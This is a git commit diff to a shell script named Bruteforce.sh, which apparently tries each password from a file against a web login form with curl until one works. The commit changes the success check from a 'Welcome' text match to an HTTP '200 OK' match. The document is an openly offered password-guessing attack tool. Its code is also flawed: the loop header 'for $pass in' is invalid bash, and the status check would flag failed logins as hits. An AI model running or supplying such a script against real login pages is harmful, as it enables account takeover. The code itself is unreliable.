acb7e7d6339fbcea67aac8168026f1cc08a354a5
Abdulrhman Ahmed <117119095+0xRudee@users.noreply.github.com>
2026-01-18 05:32:40 +0200

    Change response check to HTTP status code 200

--- Bruteforce.sh
+++ Bruteforce.sh
@@ -4,8 +4,8 @@ TARGET_URL=""
 
 for $pass in $(cat $FILEPATH); do
   echo "Trying password: $pass"
-  response=$(curl -s -X POST -d "username=$USER&password=$pass" $TARGET_URL)
-  if echo $response | grep -q "Welcome"; then
+  response=$(curl -i -s -X POST -d "username=$USER&password=$pass" $TARGET_URL)
+  if echo $response | grep -q "200 OK"; then
     echo "[+] Password Found: $pass"
     break
   fi
